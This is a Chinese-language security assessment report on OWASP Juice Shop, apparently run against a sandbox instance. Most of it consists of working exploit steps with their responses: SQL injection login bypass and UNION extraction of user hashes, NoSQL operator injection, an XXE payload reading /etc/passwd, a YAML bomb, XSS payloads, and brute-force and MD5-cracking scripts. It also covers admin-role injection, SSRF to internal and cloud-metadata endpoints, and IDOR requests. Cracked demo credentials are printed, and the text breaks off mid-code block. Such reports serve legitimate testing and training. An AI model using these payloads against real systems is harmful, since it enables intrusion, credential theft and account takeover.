# 安全评估报告

## 执行摘要
- **目标:** Juice-Shop
- **评估日期:** 2025年9月
- **范围:** 认证、XSS、SQL和命令注入、SSRF、授权测试

## 按漏洞类型汇总

**认证漏洞:**
严重的认证失败包括SQL注入认证绕过、由于缺少速率限制导致的暴力攻击、MD5密码破解、使用可预测密码的OAuth nOAuth攻击、通过重置流程进行账户枚举以及令牌重放漏洞。这些漏洞提供了对所有用户账户的完全系统入侵和未授权访问。

**授权漏洞:**
系统性的授权绕过包括对所有用户记忆的匿名访问、注册过程中的管理员角色注入、通过用户配置文件、购物篮和反馈系统的IDOR漏洞实现的水平权限提升，以及包括豪华会员支付绕过和跨用户订单结账在内的业务逻辑绕过。

**跨站脚本（XSS）漏洞:**
多个XSS攻击向量包括通过Angular安全绕过的搜索参数中的反射型XSS、启用跨域攻击的JSONP回调XSS，以及管理面板和数据导出功能中潜在的存储型XSS（被CAPTCHA保护阻止）。

**SQL/命令注入漏洞:**
严重的注入漏洞包括SQL认证绕过、用于完整数据库提取的基于UNION的SQL注入、启用大规模数据操纵的NoSQL操作符注入、XXE文件泄露以及YAML注入拒绝服务攻击。额外的潜在远程代码执行（RCE）通过VM沙箱逃逸（挑战受限）。

**服务器端请求伪造（SSRF）漏洞:**
配置文件图像URL上传中的SSRF漏洞，通过HTTP方法绕过实现内部服务访问、云元数据端点访问以及网络边界绕过，用于侦察和潜在的数据泄露。

## 网络侦察

**开放端口和服务:**
[已编辑]

**安全配置错误:**
[已编辑]

**SSL/TLS配置:**
[已编辑]

# 注入利用证据

## 成功利用的漏洞

### INJ-VULN-01: SQL注入认证绕过

**摘要:**
- **漏洞位置:** POST /rest/user/login（email字段）
- **概述:** SQL查询中的直接字符串插值实现完全认证绕过
- **影响:** 管理员访问绕过，完全系统入侵
- **严重性:** 严重

**前提条件:**
无 - 公开可访问的端点

**利用步骤:**

1. 向登录端点发送带有SQL注入payload的POST请求：
```bash
curl -X POST http://juice-shop.sandbox.local:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR '\''1'\''='\''1'\'' --","password":"test"}'
# 发送SQL注入请求，使用逻辑运算符绕过认证
```

2. 接收管理员JWT令牌和用户详情：
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
# 成功获取管理员认证信息，包含JWT令牌
```

**影响证明:**
成功绕过认证并获得用户ID 1（admin@juice-sh.op）的管理员级访问令牌，角色为"admin"。这提供了对应用程序的完全管理访问权限。

**注意事项:**
该漏洞存在于 `/routes/login.ts:34` 处的SQL查询构建中的直接字符串插值。email字段接受任意SQL命令，允许完全数据库访问。

### INJ-VULN-02: SQL注入数据提取

**摘要:**
- **漏洞位置:** GET /rest/products/search（q参数）
- **概述:** 基于UNION的SQL注入实现完整数据库提取
- **影响:** 完整用户数据库访问，包括密码哈希
- **严重性:** 严重

**前提条件:**
无 - 公开可访问的端点

**利用步骤:**

1. 确认SQL注入漏洞：
```bash
curl -s "http://juice-shop.sandbox.local:3001/rest/products/search?q=test'"
# 测试SQL注入漏洞，通过单引号触发语法错误
```
响应：SQL语法错误确认漏洞

2. 使用UNION注入提取用户凭证：
```bash
curl -s "http://juice-shop.sandbox.local:3001/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--"
# 使用UNION操作符注入，从Users表中提取用户信息
```

**影响证明:**
成功提取的用户数据库包含：
- 管理员账户：admin@juice-sh.op（哈希：0192023a7bbd73250516f069df18b500，角色：admin）
- 用户账户：jim@juice-sh.op，bender@juice-sh.op，bjoern.kimminich@gmail.com，ciso@juice-sh.op
- 所有用户的密码哈希（MD5）
- 角色分配（admin，customer，deluxe）

**注意事项:**
通过错误消息确认SQLite数据库。UNION注入需要正确关闭name和description字段中的LIKE子句。

### INJ-VULN-04: NoSQL操作符注入大规模数据操纵

**摘要:**
- **漏洞位置:** PATCH /rest/products/reviews（id字段）
- **概述:** MongoDB操作符注入启用大量文档更新
- **影响:** 完整数据完整性受损 - 所有评论被修改
- **严重性:** 高

**前提条件:**
有效的JWT认证令牌（通过INJ-VULN-01获取）

**利用步骤:**

1. 使用来自INJ-VULN-01的绕过的管理员令牌进行认证

2. 执行NoSQL操作符注入以修改所有评论：
```bash
curl -X PATCH "http://juice-shop.sandbox.local:3001/rest/products/reviews" \
  -H "Authorization: Bearer [ADMIN_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"id":{"$ne":-1},"message":"HACKED - All reviews modified"}'
# 使用$ne操作符匹配所有ID，修改所有评论内容
```

**影响证明:**
成功使用$ne（不等于）操作符修改了数据库中的28条评论。响应确认：
- 修改：28个文档
- 所有评论消息更改为"HACKED - All reviews modified"
- 影响来自不同产品的多个用户的评论

**注意事项:**
$ne操作符绕过了预期的单个文档更新限制，这是由于对象注入漏洞和{ multi: true }设置。

### INJ-VULN-06: XXE文件泄露

**摘要:**
- **漏洞位置:** POST /file-upload（XML文件内容）
- **概述:** XML外部实体处理启用文件系统访问
- **影响:** 从服务器文件系统泄露敏感文件
- **严重性:** 高

**前提条件:**
有效的JWT认证令牌

**利用步骤:**

1. 创建带有外部实体payload的XML文件：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
<!-- 创建包含外部实体的XML文件，引用系统文件 -->
```

2. 上传恶意XML文件：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/file-upload" \
  -H "Authorization: Bearer [TOKEN]" \
  -F "file=@xxe_test.xml"
# 上传包含XXE payload的XML文件
```

**影响证明:**
成功提取了`/etc/passwd`文件内容：
```
root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
```

**注意事项:**
通过启用外部实体处理的libxml.parseXml()与noent: true配置确认XXE漏洞。

### INJ-VULN-07: YAML注入拒绝服务

**摘要:**
- **漏洞位置:** POST /file-upload（YAML文件内容）
- **概述:** YAML炸弹攻击导致资源耗尽
- **影响:** 通过内存耗尽实现拒绝服务
- **严重性:** 中

**前提条件:**
有效的JWT认证令牌

**利用步骤:**

1. 创建带有锚点引用的YAML炸弹文件：
```yaml
a: &a ["x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b]
# 创建YAML炸弹，通过锚点引用实现指数级对象扩展
```

2. 上传YAML炸弹：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/file-upload" \
  -H "Authorization: Bearer [TOKEN]" \
  -F "file=@yaml_bomb.yml"
# 上传YAML炸弹文件，触发资源耗尽
```

**影响证明:**
成功触发了指数级对象扩展，在错误响应中可见嵌套数组结构按设计展开。YAML炸弹通过锚点/引用扩展消耗了服务器资源。

**注意事项:**
漏洞存在于js-yaml库中使用不安全的yaml.load()方法而不是yaml.safeLoad()。


# 跨站脚本（XSS）利用证据

## 成功利用的漏洞

### XSS-VULN-01: 搜索参数中的反射型XSS（Angular安全绕过）

**摘要:**
- **漏洞位置:** http://juice-shop.sandbox.local:3001/#/search?q=[PAYLOAD]
- **概述:** 搜索查询参数直接通过Angular的bypassSecurityTrustHtml()函数处理，无 sanitization
- **影响:** 在受害者浏览器中立即执行JavaScript，访问会话令牌，可能用于钓鱼和数据窃取
- **严重性:** 中

**前提条件:**
无 - 无需认证即可公开访问

**利用步骤:**
1. 导航至：`http://juice-shop.sandbox.local:3001/#/search?q=<img src=x onerror=alert('XSS')>`
2. 观察通过alert对话框立即执行JavaScript

**影响证明:**
成功实现了JavaScript执行，如显示"XSS"消息的alert对话框所示。payload `<img src=x onerror=alert('XSS')>` 被注入到搜索参数中并在没有任何sanitization的情况下执行。

**注意事项:**
此漏洞可用于会话劫持，方法是将alert替换为cookie泄露代码。攻击有效是因为Angular的bypassSecurityTrustHtml()方法明确绕过了搜索结果显示的XSS保护。

### XSS-VULN-02: JSONP回调XSS

**摘要:**
- **漏洞位置:** http://juice-shop.sandbox.local:3001/rest/user/whoami?callback=[PAYLOAD]
- **概述:** JSONP回调参数允许通过跨域脚本包含执行任意JavaScript函数
- **影响:** 跨域JavaScript执行，数据泄露，绕过同源策略
- **严重性:** 中

**前提条件:**
无 - 端点无需认证即可访问

**利用步骤:**
1. 从任何网页上下文创建指向易受攻击端点的脚本标签：
```javascript
const script = document.createElement('script');
script.src = '/rest/user/whoami?callback=alert';
document.head.appendChild(script);
// 创建脚本标签，利用JSONP回调执行任意JavaScript
```
2. 观察通过带有用户数据对象的alert对话框执行JavaScript

**影响证明:**
成功实现了JavaScript执行，如显示包含用户数据的"[object Object]"的alert对话框所示。JSONP端点生成响应格式：`/**/ typeof alert === 'function' && alert({"user":{}});` 执行注入的回调函数。

**注意事项:**
此漏洞启用跨域攻击，可用于从JSONP端点泄露用户数据。攻击者可以托管恶意页面，将此端点作为脚本源包含以窃取用户信息。

# 认证利用证据

## 成功利用的漏洞

### AUTH-VULN-06: SQL注入认证绕过

**摘要:**
- **漏洞位置:** POST /rest/user/login端点
- **概述:** 通过email参数中的SQL注入实现完全认证绕过
- **影响:** 管理员账户接管和完整用户数据库访问
- **严重性:** 严重

**利用步骤:**

1. 识别登录查询结构中的SQL注入漏洞：`SELECT * FROM Users WHERE email = '${req.body.email}'`

2. 执行SQL注入payload以绕过认证：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
-H "Content-Type: application/json" \
-d '{"email":"admin@juice-sh.op'\'' OR 1=1-- ","password":"anything"}'
# 使用SQL注入绕过认证，获取管理员权限
```

3. 服务器返回HTTP 200，包含完整的管理员认证：
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
# 成功获取管理员JWT令牌
```

4. 通过访问受保护的管理员数据验证账户接管：
```bash
curl "http://juice-shop.sandbox.local:3001/api/Users" \
-H "Authorization: Bearer [JWT_TOKEN]"
# 使用获取的令牌访问管理员数据
```

**影响证明:**
成功获得管理员JWT令牌并访问包含敏感信息的完整用户数据库，包括所有应用程序用户的电子邮件、角色和MD5密码哈希。

### AUTH-VULN-05: 暴力破解登录攻击（无速率限制）

**摘要:**
- **漏洞位置:** POST /rest/user/login端点  
- **概述:** 无限制的认证尝试，无速率限制或账户锁定
- **影响:** 通过自动化攻击成功发现凭证
- **严重性:** 高

**利用步骤:**

1. 对已知的管理员账户执行自动化暴力破解攻击：
```python
# 10次使用常见密码的快速认证尝试
passwords = ["admin", "password", "123456", "admin123", ...]
for password in passwords:
    response = requests.post(target_url, json={"email": "admin@juice-sh.op", "password": password})
# 自动化暴力破解脚本，尝试多个常见密码
```

2. 在第4次尝试时成功认证：
- **发现的凭证:** `admin@juice-sh.op:admin123`
- **响应时间:** 每次尝试平均386ms（无延迟）
- **结果:** HTTP 200，带有有效的JWT令牌

**影响证明:**
证明完全缺乏暴力破解保护，允许无限快速的认证尝试。通过自动化字典攻击成功发现有效的管理员凭证 `admin@juice-sh.op:admin123`。

### AUTH-VULN-07: 通过MD5哈希破解密码

**摘要:**
- **漏洞位置:** SQLite数据库中的密码存储
- **概述:** 无盐的弱MD5哈希启用快速密码恢复
- **影响:** 多个用户账户密码成功破解
- **严重性:** 高

**利用步骤:**

1. 通过先前的SQL注入从用户数据库中提取密码哈希
2. 实现MD5字典攻击：
```python
import hashlib
target_hash = "0192023a7bbd73250516f069df18b500"  # admin hash
for password in wordlist:
    if hashlib.md5(password.encode()).hexdigest() == target_hash:
        print(f"Password found: {password}")
# 使用MD5字典攻击破解密码哈希
```

3. 每个账户在<0.001秒内成功破解多个账户：
- `admin@juice-sh.op` → `admin123`
- `jim@juice-sh.op` → `ncc-1701`
- `demo` → `demo`
- `ethereum@juice-sh.op` → `private`

**影响证明:**
实现了100%的MD5密码哈希破解成功率，证明由于弱哈希算法，所有用户密码都容易受到彩虹表和字典攻击。

### AUTH-VULN-08: 使用可预测密码的nOAuth攻击

**摘要:**
- **漏洞位置:** OAuth回调处理和密码生成
- **概述:** OAuth用户被分配使用btoa(email.reverse())的可预测密码
- **影响:** 通过算法预测对任何OAuth用户进行账户接管
- **严重性:** 严重

**利用步骤:**

1. 实现OAuth密码生成算法：
```python
def generate_oauth_password(email):
    reversed_email = email[::-1]
    return base64.b64encode(reversed_email.encode()).decode()
# 实现OAuth密码生成算法，预测用户密码
```

2. 为目标管理员账户生成密码：
```python
email = "bjoern.kimminich@gmail.com"
password = generate_oauth_password(email)
# Result: "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="
```

3. 使用生成的密码成功认证：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
-H "Content-Type: application/json" \
-d '{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1paz5ucmVvamI="}'
# 使用预测的密码登录OAuth用户账户
```

**影响证明:**
使用可预测的密码生成算法成功入侵管理员OAuth账户，获得带有管理员权限的有效JWT令牌。

### AUTH-VULN-09: 通过重置密码流程进行账户枚举

**摘要:**
- **漏洞位置:** GET /rest/user/security-question端点
- **概述:** 不同的响应揭示有效的vs无效的电子邮件地址
- **影响:** 系统性枚举有效用户账户
- **严重性:** 中

**利用步骤:**

1. 测试有效的电子邮件地址：
```bash
curl "http://juice-shop.sandbox.local:3001/rest/user/security-question?email=admin@juice-sh.op"
# 测试有效的电子邮件地址，获取安全问题
```
响应：`{"question":{"id":2,"question":"Mother's maiden name?","createdAt":"2025-09-16T16:47:15.131Z","updatedAt":"2025-09-16T16:47:15.131Z"}}` (134 bytes)

2. 测试无效的电子邮件地址：
```bash
curl "http://juice-shop.sandbox.local:3001/rest/user/security-question?email=nonexistent@example.com"
# 测试无效的电子邮件地址，观察不同响应
```
响应：`{}` (2 bytes)

3. 自动枚举发现4个有效账户：
- `admin@juice-sh.op`（返回安全问题）
- `jim@juice-sh.op`（返回安全问题）
- `bender@juice-sh.op`（返回安全问题）  
- `demo`（返回安全问题）

**影响证明:**
通过响应模式分析成功枚举了有效用户账户，为每个有效账户获取了安全问题，从而能够进行进一步的社会工程学攻击。

### AUTH-VULN-10: 注销后的令牌重放（无服务器端失效）

**摘要:**
- **漏洞位置:** 认证令牌管理系统
- **概述:** 无服务器端注销端点 - 客户端注销后令牌仍然有效
- **影响:** 被盗令牌可无限期使用，直到过期
- **严重性:** 高

**利用步骤:**

1. 通过认证获取有效的JWT令牌：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
-d '{"email":"jim@juice-sh.op","password":"ncc-1701"}'
# 登录获取有效的JWT令牌
```

2. 验证令牌提供对受保护资源的访问：
```bash
curl "http://juice-shop.sandbox.local:3001/rest/basket/2" \
-H "Authorization: Bearer [JWT_TOKEN]"
# 验证令牌可访问受保护资源
```
响应：HTTP 200，带有用户的购物篮数据

3. 尝试服务器端注销（证明不存在端点）：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/logout" \
-H "Authorization: Bearer [JWT_TOKEN]"
# 尝试服务器端注销，确认不存在此端点
```
响应：HTTP 500 "Error: Unexpected path: /rest/user/logout"

4. 验证令牌在尝试注销后仍然有效：
```bash
curl "http://juice-shop.sandbox.local:3001/api/Users/2" \
-H "Authorization: Bearer [JWT_TOKEN]"
# 验证令牌在尝试注销后仍然有效
```
响应：HTTP 200，带有完整的用户配置文件数据

**影响证明:**
证明JWT令牌无限期有效，因为不存在服务器端失效机制。即使受害者认为已注销，令牌也可以重放以访问用户账户。

## 确认存在但未成功利用的漏洞

### AUTH-VULN-01: 通过HTTP传输的凭证拦截

**摘要:**
- **漏洞位置:** 所有认证端点  
- **影响:** 凭证通过HTTP以明文传输
- **严重性:** 严重

**利用步骤:**

1. 验证应用程序接受HTTP连接：
```bash
curl -I http://juice-shop.sandbox.local:3001/
# 验证应用程序接受HTTP连接
```
响应：HTTP 200 OK（无HTTPS重定向）

2. 演示通过HTTP登录的凭证暴露：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
-H "Content-Type: application/json" \
-d '{"email":"test@example.com","password":"testpassword"}' \
-v
# 演示HTTP登录时的凭证明文传输
```

**漏洞证据:**
详细输出显示完整的HTTP请求，凭证以明文传输。任何网络攻击者都可以通过数据包捕获或中间人攻击拦截认证数据。

### AUTH-VULN-02: 协议降级攻击（无HSTS头）

**摘要:**
- **漏洞位置:** 所有HTTPS端点
- **影响:** 攻击者可以强制客户端使用HTTP而不是HTTPS
- **严重性:** 高

**利用步骤:**

1. 检查HSTS头的存在：
```bash
curl -I "https://juice-shop.sandbox.local:3001/" | grep -i hsts
# 检查HSTS头是否存在
```
结果：未找到HSTS头

**漏洞证据:**
缺少HTTP严格传输安全（HSTS）头允许协议降级攻击，攻击者可以剥离HTTPS并强制受害者通过未加密的HTTP通信。

### AUTH-VULN-03: 通过非安全Cookie的会话劫持

**摘要:**
- **漏洞位置:** 认证响应中的Cookie配置
- **影响:** 会话Cookie容易受到基于XSS的窃取
- **严重性:** 高

**利用步骤:**

1. 分析登录响应中的安全Cookie标志：
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
-d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' \
-v 2>&1 | grep -i "set-cookie"
# 分析登录响应中的Cookie配置
```
结果：未观察到安全Cookie头

**漏洞证据:**
会话Cookie缺少HttpOnly、Secure和SameSite标志，使其可被JavaScript访问并容易受到基于XSS的会话劫持攻击。


# SSRF利用证据

## 成功利用的漏洞

### SSRF-VULN-01: 配置文件图像URL上传中的HTTP方法绕过

**摘要:**
- **漏洞位置:** 通过HTTP方法绕过可访问的 `POST /profile/image/url` 端点
- **影响:** 能够从服务器向内部服务和外部目标发出任意HTTP请求
- **严重性:** 高

**前提条件:**
- 有效的用户账户（通过注册免费获得）
- JWT认证令牌（通过 `/rest/user/login` 获取）

**利用步骤:**

1. **注册用户账户：**
   ```bash
   curl -X POST http://juice-shop.sandbox.local:3001/api/Users \
     -H "Content-Type: application/json" \
     -d '{"email":"ssrf.test@example.com","password":"TestPassword123","passwordRepeat":"TestPassword123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2024-01-01","updatedAt":"2024-01-01"},"securityAnswer":"test"}'
   # 注册新用户账户
   ```

2. **认证并获取JWT令牌：**
   ```bash
   curl -X POST http://juice-shop.sandbox.local:3001/rest/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"ssrf.test@example.com","password":"TestPassword123"}'
   # 登录获取JWT令牌
   ```

3. **使用PUT方法绕过SSRF保护：**
   ```bash
   curl -X PUT http://juice-shop.sandbox.local:3001/profile/image/url \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:3001/solve/challenges/server-side-request-forgery"}'
   # 使用PUT方法绕过SSRF保护
   ```

4. **访问内部服务：**
   ```bash
   # 通过localhost访问同一服务器
   curl -X PUT http://juice-shop.sandbox.local:3001/profile/image/url \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://127.0.0.1:3001/rest/admin/application-configuration"}'
   
   # 访问加密密钥
   curl -X PUT http://juice-shop.sandbox.local:3001/profile/image/url \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:3001/encryptionkeys/jwt.pub"}'
   
   # 访问内部文件资源
   curl -X PUT http://juice-shop.sandbox.local:3001/profile/image/url \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:3001/ftp/incidents/suspicious_errors.yml"}'
   # 访问内部服务和敏感资源
   ```

**影响证明:**

1. **方法绕过发现：** 
   - POST请求返回302重定向（被阻止）：`Found. Redirecting to /profile` (30 bytes)
   - PUT请求返回200 OK，带有完整的HTML内容 (80,117 bytes)

2. **内部服务访问确认：**
   - 成功访问localhost上的各种端口服务（22, 80, 3000, 3001, 8080, 9090）
   - 通过内部请求检索完整的OWASP Juice Shop应用程序HTML
   - 访问受保护的端点，如 `/encryptionkeys/jwt.pub` 和 `/ftp/incidents/`

3. **网络边界绕过：**
   - 服务器向用户控制的目标发出HTTP请求
   - 无目标IP范围验证（可访问私有IP，localhost）
   - 无协议限制（可访问各种URL方案）

**注意事项:**
- 该漏洞通过使用PUT/PATCH方法绕过了预期的POST-only保护
- 服务器通过Node.js `fetch()` API处理 `imageUrl` 参数，无验证
- 所有内部网络资源都可访问，包括同服务器端点
- 可访问云元数据端点（AWS/GCP/Azure）：`http://169.254.169.254/latest/meta-data/`
- 这代表经典的服务器端请求伪造（SSRF）漏洞，允许网络侦察和潜在的数据泄露


# 授权利用证据

## 成功利用的漏洞

### AUTHZ-VULN-04: 对所有用户记忆的匿名访问

**摘要:**
- **漏洞位置:** GET /rest/memories端点
- **概述:** 无需认证即可完全匿名访问所有用户的私人记忆
- **影响:** 严重数据泄露，包括个人照片、用户信息和私人内容
- **严重性:** 严重

**前提条件:** 
无 - 无需认证

**利用步骤:**

1. 向memories端点发出未认证的GET请求：
```bash
curl -s -i "http://juice-shop.sandbox.local:3001/rest/memories"
# 无需认证访问所有用户的记忆
```

2. 接收包含所有用户记忆的完整响应：
```json
{
  "status": "success",
  "data": [
    {
      "UserId": 13,
      "id": 1,
      "caption": "😼 #zatschi #whoneedsfourlegs",
      "imagePath": "assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg",
      "User": {
        "id": 13,
        "email": "bjoern@owasp.org",
        "password": "9283f1b2e9669749081963be0462e466",
        "role": "deluxe",
        "deluxeToken": "efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4"
      }
    },
    // ... 9 more user memories with full user data
  ]
}
# 成功获取所有用户的记忆和完整用户数据
```

**影响证明:**
- **零认证要求** - 完全公开的端点
- **10+用户记忆暴露** 包括私人照片和说明
- **完整用户数据泄露** 包括电子邮件、密码哈希、角色和豪华令牌
- **受影响用户:** 管理员用户（bjoern.kimminich@gmail.com）、豪华用户（bjoern@owasp.org）和普通客户

### AUTHZ-VULN-06: 注册期间的管理员角色注入

**摘要:**
- **漏洞位置:** POST /api/Users端点
- **概述:** 通过在注册期间注入管理员角色创建管理员账户
- **影响:** 从匿名到完全管理员访问的完整权限提升
- **严重性:** 严重

**前提条件:**
无 - 公开注册端点

**利用步骤:**

1. 注册带有管理员角色注入的新用户：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Users" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "pwned@evil.com",
    "password": "Password123!",
    "passwordRepeat": "Password123!",
    "role": "admin"
  }'
# 在注册时注入admin角色，创建管理员账户
```

2. 接收成功的管理员账户创建：
```json
{
  "status": "success",
  "data": {
    "id": 65,
    "email": "pwned@evil.com",
    "role": "admin",
    "profileImage": "/assets/public/images/uploads/defaultAdmin.png"
  }
}
# 成功创建管理员账户
```

3. 使用新管理员账户登录：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "pwned@evil.com",
    "password": "Password123!"
  }'
# 使用新创建的管理员账户登录
```

4. 接收确认权限提升的管理员JWT令牌

**影响证明:**
- **管理员账户创建** 带有用户ID 65和完整管理员权限
- **无验证** 注册期间的角色分配
- **完全访问** 所有管理功能和敏感数据
- **绕过机制:** 无任何授权检查的直接角色注入

### AUTHZ-VULN-07: 普通用户创建产品

**摘要:**
- **漏洞位置:** POST /api/Products端点
- **概述:** 普通客户账户可以在无管理员权限的情况下创建产品
- **影响:** 产品目录操纵和未授权用户的内容污染
- **严重性:** 高

**前提条件:**
有效的客户级认证令牌

**利用步骤:**

1. 注册为普通客户：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Users" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "regular@user.com",
    "password": "Password123!",
    "passwordRepeat": "Password123!"
  }'
# 注册普通客户账户
```

2. 登录获取客户令牌：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "regular@user.com",
    "password": "Password123!"
  }'
# 登录获取客户令牌
```

3. 使用客户令牌创建产品：
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Products" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacked Product by Regular User",
    "description": "This product was created by a regular customer account - proving authorization bypass!",
    "price": 999.99,
    "image": "malicious.jpg"
  }'
# 普通客户创建产品，绕过授权检查
```

4. 接收成功的产品创建：
```json
{
  "status": "success",
  "data": {
    "id": 47,
    "name": "Hacked Product by Regular User",
    "description": "This product was created by a regular customer account - proving authorization bypass!",
    "price": 999.99
  }
}
# 成功创建产品
```

**影响证明:**
- **产品创建** 由普通客户账户（产品ID 47）
- **缺少角色验证** 允许非管理员用户创建产品
- **业务中断** 通过未授权的产品目录操纵
- **内容污染** 可能包含恶意或不适当的产品

### AUTHZ-VULN-01: 用户配置文件数据访问（IDOR）

**摘要:**
- **漏洞位置:** GET /api/Users/:id端点
- **概述:** 任何认证用户可以访问任何其他用户的配置文件数据
- **影响:** 完整用户数据暴露，包括电子邮件、角色和配置文件信息
- **严重性:** 高

**前提条件:**
有效的认证令牌（任何角色）

**利用步骤:**

1. 以普通客户（用户ID 66）身份认证
2. 访问管理员用户配置文件（用户ID 4）：
```bash
curl -s -i "http://juice-shop.sandbox.local:3001/api/Users/4" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]"
# 普通客户访问管理员配置文件
```

3. 接收未授权的管理员配置文件访问：
```json
{
  "status": "success",
  "data": {
    "id": 4,
    "username": "bkimminich",
    "email": "bjoern.kimminich@gmail.com",
    "role": "admin",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png"
  }
}
# 成功获取管理员配置文件数据
```

4. 访问豪华用户配置文件（用户ID 13）：
```bash
curl -s "http://juice-shop.sandbox.local:3001/api/Users/13" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]"
# 普通客户访问豪华用户配置文件
```

5. 接收包含敏感令牌的豪华用户数据：
```json
{
  "status": "success",
  "data": {
    "id": 13,
    "email": "bjoern@owasp.org",
    "role": "deluxe",
    "deluxeToken": "efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4"
  }
}
# 成功获取豪华用户数据，包括敏感令牌
```

**影响证明:**
- **跨用户数据访问** - 客户账户访问管理员和豪华用户配置文件
- **敏感数据暴露** 包括电子邮件、角色、用户名和豪华令牌
- **系统性漏洞** 影响系统中的所有用户配置文件
- **无所有权验证** 对用户配置文件访问

### AUTHZ-VULN-02: 购物篮访问（IDOR）

**摘要:**
- **漏洞位置:** GET /rest/basket/:id端点
- **概述:** 认证用户可以访问任何其他用户的购物篮
- **影响:** 财务数据暴露，包括购物偏好和购物篮内容
- **严重性:** 高

**前提条件:**
有效的认证令牌（任何角色）

**利用步骤:**

1. 访问另一个用户的购物篮（购物篮ID 1）：
```bash
curl -s -i "http://juice-shop.sandbox.local:3001/rest/basket/1" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]"
# 访问其他用户的购物篮
```

2. 接收完整的购物篮数据：
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "UserId": 1,
    "Products": [
      {
        "id": 1,
        "name": "Apple Juice (1000ml)",
        "price": 1.99,
        "BasketItem": {
          "ProductId": 1,
          "BasketId": 1,
          "quantity": 2
        }
      },
      {
        "id": 2,
        "name": "Orange Juice (1000ml)",
        "price": 2.99,
        "BasketItem": {
          "quantity": 3
        }
      }
    ]
  }
}
# 成功获取其他用户的购物篮数据
```

3. 访问不同用户的购物篮（购物篮ID 2），显示系统性问题

**影响证明:**
- **未授权购物篮访问** - 查看其他用户的购物数据
- **财务信息暴露** 包括产品偏好和数量
- **总购物篮价值泄露** (~$20.94 对于访问的购物篮)
- **系统性漏洞** 影响所有用户购物篮

### AUTHZ-VULN-03: 反馈数据访问（IDOR）

**摘要:**
- **漏洞位置:** GET /api/Feedbacks/:id端点
- **概述:** 认证用户可以访问其他用户的私人反馈
- **影响:** 个人意见和评分数据暴露
- **严重性:** 中

**前提条件:**
有效的认证令牌（任何角色）

**利用步骤:**

1. 访问另一个用户的反馈（反馈ID 1）：
```bash
curl -s -i "http://juice-shop.sandbox.local:3001/api/Feedbacks/1" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]"
# 访问其他用户的反馈数据
```

2. 接收未授权的反馈数据：
```json
{
  "status": "success",
  "data": {
    "UserId": 1,
    "id": 1,
    "comment": "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)",
    "rating": 5
  }
}
# 成功获取其他用户的反馈数据
```

**影响证明:**
- **私人反馈暴露** 包括个人评论和评分
- **用户识别** 通过部分电子邮件披露（***in@juice-sh.op）
- **意见数据泄露** 揭示用户满意度和偏好
- **跨用户访问** 无所有权验证

### AUTHZ-VULN-05: 购物篮项目修改（IDOR）

**摘要:**
- **漏洞位置:** PUT /api/BasketItems/:id端点
- **概述:** 认证用户可以修改其他用户的购物篮项目
- **影响:** 财务操纵和购物车篡改
- **严重性:** 高

**前提条件:**
有效的认证令牌（任何角色）

**利用步骤:**

1. 访问另一个用户的购物篮项目（项目ID 1）：
```bash
